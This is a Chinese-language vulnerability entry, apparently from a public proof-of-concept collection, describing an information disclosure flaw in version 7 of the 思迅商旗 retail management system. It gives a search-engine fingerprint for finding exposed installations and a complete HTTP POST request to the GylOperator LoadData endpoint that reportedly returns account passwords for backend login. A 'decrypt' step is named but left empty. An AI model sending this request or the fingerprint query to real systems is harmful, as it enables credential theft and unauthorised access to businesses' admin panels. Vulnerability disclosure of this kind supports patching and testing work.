# 思迅商旗商业管理系统7 GylOperator存在信息泄露漏洞

# 一、漏洞简介
思迅商旗商业管理系统是基于互联网部署的全新零售管理系统。提炼各架构优势之大成，打造全新互联网产品。思迅商旗商业管理系统GylOperator存在信息泄露漏洞，<font style="color:rgba(0, 0, 0, 0.9);">攻击者可通过该漏洞在服务器端读取账户密码，从而登录后台。</font>

# <font style="color:rgba(0, 0, 0, 0.9);">二、影响版本</font>
+ 思迅商旗商业管理系统7

# 三、资产测绘
+ hunter`app.name=="思迅商旗"`
+ 特征


# 四、漏洞复现
```java
POST /api/GylOperator/LoadData HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Content-Length: 68
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cache-Control: no-cache
Connection: close
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest

loadAll=false&key=&oper_role=&gridFlag=GylOperatorList&page=1&rows=1
```


解密


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/vzyrz9h4ztl1gdca>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
